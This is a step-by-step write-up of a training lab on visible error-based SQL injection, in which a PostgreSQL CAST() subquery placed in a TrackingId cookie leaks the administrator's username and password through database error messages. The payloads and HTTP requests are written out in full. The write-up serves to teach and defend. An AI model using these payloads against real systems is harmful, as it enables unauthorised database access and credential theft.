# SQL Injection - Lab #18: Visible Error-Based SQL Injection

**YouTube Tutorial:** [SQL Injection - Lab #18 Visible error-based SQL injection (Short Version)](https://youtu.be/sAZV4z9rOVE)

---

## 1. What is Visible Error-Based SQLi?

### Core Concept

This lab is **blind SQL injection** in its purest form — the application executes the SQL query containing the `TrackingId` cookie value, but **never returns the query results** in the HTTP response. Boolean-based, time-based, and UNION techniques would technically work here, but there's a much faster route: the application is running in **verbose error mode** and returns **full database error messages** in the HTTP response.

**Visible Error-Based SQL Injection** weaponizes those error messages. Instead of extracting data via timing or response differences, an attacker forces the database to generate an error that **contains the stolen data itself**. The classic trick is `CAST()`:

* **`CAST(value AS int)`** tells the database to convert a value to an integer type.
* If the value is a **text string** (like a username or password), the conversion **fails** — and PostgreSQL's error message dutifully echoes the offending string:

```
ERROR: invalid input syntax for type integer: "administrator"
```

* The attacker nests a `SELECT` subquery **inside** the `CAST()`: the subquery retrieves the target data, the cast fails, and the error message leaks the data into the HTTP response — no timing, no OOB, no conditional logic required.

This effectively converts an otherwise **blind** SQL injection into a **visible** one, using the database's own error reporting as the output channel.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Parameter:** The `TrackingId` cookie value sent in HTTP requests.
* **Blind SQL Injection Mechanism:** The app concatenates the cookie into a SQL query but suppresses query output — the HTTP body never shows query results.
* **Verbose Errors:** The application does **not** suppress database errors — full PostgreSQL error messages (including the query and the offending value) are rendered in the response.
* **Database:** **PostgreSQL** (`CAST(... AS int)`, `LIMIT 1` syntax).
* **Exploitation Technique:** Induce a **type-mismatch error** with `CAST()` so the error message echoes data returned by an injected subquery.

### Root Cause & Impact

* **Root Cause #1:** Insecure concatenation of cookie values into backend SQL queries without parameterized input filtering.
* **Root Cause #2:** Debug/verbose error reporting left enabled in production — database exceptions are dumped into the HTTP response.
* **End Goals:**
  * Use `CAST()` error-based injection to leak the `administrator` user's password.
  * Log in as `administrator` to complete the lab.

---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 1 (Confirm Injection):** Append a single quote `'` to the `TrackingId` cookie → the query breaks → a **verbose SQL error** appears in the response, confirming injection and verbose error mode.
* **Phase 2 (Repair Syntax):** Append `--` to comment out the rest of the query and restore a valid statement.
* **Phase 3 (Test CAST):** Inject `AND CAST((SELECT 1) AS int)--` → observe the error `argument of AND must be type boolean, not type integer` — proves the `CAST()` expression is being evaluated inside the query.
* **Phase 4 (Boolean-ify):** Wrap as `AND 1=CAST((SELECT 1) AS int)--` so the expression returns TRUE (valid cast) and the query runs cleanly — the baseline for all subsequent probes.
* **Phase 5 (Enumerate Username):** `AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` → cast fails, error reveals the first username: `administrator`.
* **Phase 6 (Exfiltrate Password):** Same query against `password` → error reveals the administrator's password.
* **Phase 7 (Login):** Use the leaked credentials on `/login` to solve the lab.

### Server Behavior

* **Broken query (`'`):** HTTP 500 with a **verbose PostgreSQL error** (query syntax displayed).
* **Valid query with `--`:** Normal HTTP 200 response.
* **Failed `CAST()` on text:** HTTP 500 with `ERROR: invalid input syntax for type integer: "<LEAKED DATA>"` — this is your data channel.
* **Multiple rows in subquery:** `more than one row returned by a subquery used as an expression` — use `LIMIT 1`.

---

## 4. Step-by-Step Walkthrough

### Step 1: Capture the Request with the TrackingId Cookie

1. Open the lab in Burp's built-in browser and browse the front page.
2. Go to **Proxy > HTTP history** and find a `GET /` request containing the `TrackingId` cookie.
3. Right-click → **Send to Repeater**.

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: TrackingId=ogAZZfxtOKUELbuJ; session=[SESSION-COOKIE]
```

### Step 2: Confirm the Injection & Verbose Errors

1. Append a single quote to the cookie value:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'
```

2. **Result:** The response returns a **500 error with a verbose PostgreSQL error message** (the backend query shown in full). This confirms both the injection point and that errors are reflected.

### Step 3: Repair the Query Syntax

1. Comment out the remainder of the query:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ'--
```

2. **Result:** Normal response (no error) — the query is syntactically valid again.

### Step 4: Test the CAST Expression

1. Inject a generic `SELECT` subquery cast to `int`:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

2. **Result:** You get the error `argument of AND must be type boolean, not type integer` — proof that the database evaluated your `CAST()` expression.

### Step 5: Make the Expression Boolean

1. Wrap it in a comparison so the cast result is compared as a boolean:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

2. **Result:** No error — `CAST((SELECT 1) AS int)` equals `1`, so the `AND` is TRUE. This is your clean baseline for data extraction.

### Step 6: Identify the First Username

1. Swap the subquery to read from `users`:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

2. **Result:** The cast fails (text → int) and the verbose error leaks the value:

```
ERROR: invalid input syntax for type integer: "administrator"
```

3. **Confirmed:** The first user in the `users` table is `administrator`.

> **Why `LIMIT 1`?** Without it, the subquery would return multiple rows and PostgreSQL would throw `more than one row returned by a subquery used as an expression` — which leaks nothing useful.

### Step 7: Leak the Administrator's Password

1. Point the same query at the `password` column:

```http
Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

2. **Result:** The error message reveals the password:

```
ERROR: invalid input syntax for type integer: "q1uuvho3ov5renjtp936"
```

3. **Extracted credentials:**
* **Username:** `administrator`
* **Password:** `q1uuvho3ov5renjtp936`

> ⚠️ **Note:** The password is randomly generated per lab instance — read yours from your own error message.

### Step 8: Log in as Administrator

1. Navigate to `/login` on the application.
2. Log in with:
* **Username:** `administrator`
* **Password:** `<extracted password>`

3. The lab displays **"Congratulations, you solved the lab!"**.

> ⚠️ **Note:** - **character count Limitation**
  another error is that its LIMIT the payload --> pls follow this'steps character count Limitation 
 > Identified that the original cookie value reduces available payload length.
 > Removed the original cookie value to maximize available payload space.

 >like removing the TrackingId cookie---->
> Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

---

## 5. Pro-Tips & Common Pitfalls

* **URL-encode the payload in the cookie:** The space and `=` inside `CAST((SELECT 1) AS int)` can break the header if left raw. In Repeater, select the payload and use **Ctrl+U** (URL-encode key characters) before sending.
* **Verbose errors are the whole game:** This technique only works because the app leaks database exceptions. If errors were suppressed, you'd be back to boolean/time-based blind — check the response body carefully after the single quote test.
* **`CAST()` is the data channel:** Text-to-int conversion always fails, and PostgreSQL always echoes the offending string in the error. That echo IS your output — no UNION, no timing, no OOB needed.
* **Always `LIMIT 1`:** A multi-row subquery throws a generic "more than one row" error with no data. Keep the subquery to exactly one row (the lab's `users` table has `administrator` first).
* **Order matters — username first:** Confirm the first row is `administrator` via `username` before dumping `password`; the row order is shared, so the password you leak belongs to that same first row.
* **`AND 1=CAST(...)` vs `AND CAST(...)`:** The bare `AND CAST((SELECT 1) AS int)` is not boolean — PostgreSQL rejects it with a type error (which conveniently confirms the expression is evaluated). The `1=` form makes it a valid boolean predicate that runs cleanly, which is what you want for the extraction payloads.
* **No Burp Pro needed:** Everything happens in the HTTP response — this lab is fully solvable with **Burp Suite Community Edition** (Repeater is enough).
* **Real-world note:** Verbose error reporting is an information-disclosure bug in its own right (OWASP A09:2021 Security Logging & Monitoring Failures / misconfiguration). In production, DB errors should be logged server-side, never rendered to clients — this lab is exactly why.